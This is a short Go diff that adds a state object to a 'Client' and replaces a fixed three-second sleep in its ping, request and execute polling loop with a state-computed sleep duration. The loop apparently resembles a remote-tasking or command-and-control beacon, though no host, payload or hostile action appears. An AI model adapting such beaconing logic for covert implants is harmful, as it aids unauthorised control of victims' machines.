@@ -19,6 +19,7 @@ type Client struct {
 	Config   ClientConfig
 	Campaign model.Campaign
 	coder    model.Coder
+	state    ClientState
 
 	packetExecutor PacketExecutor
 }
@@ -32,6 +33,7 @@ func NewClient() Client {
 		config,
 		campaign,
 		coder,
+		MakeClientState(),
 		MakePacketExecutor(),
 	}
 	return w
@@ -77,9 +79,8 @@ func (s *Client) Start() {
 	s.sendPing()
 	for {
 		gotPacket := s.requestAndExecute()
-		if !gotPacket {
-			time.Sleep(3 * time.Second)
-		}
+		sleepDuration := s.state.getSleepDuration(gotPacket)
+		time.Sleep(sleepDuration)
 	}
 }
 
